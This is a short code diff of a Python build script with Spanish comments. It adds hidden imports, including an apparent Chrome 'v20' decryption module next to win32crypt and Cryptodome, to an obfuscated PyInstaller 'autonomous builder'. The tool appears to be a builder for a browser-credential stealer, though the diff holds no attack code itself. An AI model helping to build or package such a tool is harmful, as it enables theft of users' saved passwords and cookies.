@@ -195,6 +195,7 @@ Ejemplos de uso:
         # Agregamos imports críticos para que el EXE sea un Constructor Autónomo
         hidden_imports = [
             "win32crypt", "Cryptodome", "requests", "customtkinter",
+            "PIL", "modules.chrome_v20_decryption.v20_decryptor",
             "PyInstaller", "pyarmor", "pyarmor.cli"
         ]
         for imp in hidden_imports:
@@ -235,7 +236,10 @@ Ejemplos de uso:
 
             # --- Step 2: Run PyInstaller directly on the obfuscated output ---
             v_file = create_version_file(args)
-            hidden_imports = ["win32crypt", "Cryptodome", "requests", "customtkinter"]
+            hidden_imports = [
+                "win32crypt", "Cryptodome", "requests", "customtkinter", 
+                "PIL", "modules.chrome_v20_decryption.v20_decryptor"
+            ]
 
             pyi_cmd = [python, "-m", "PyInstaller", obf_script]
             pyi_cmd += ["--name", args.name]
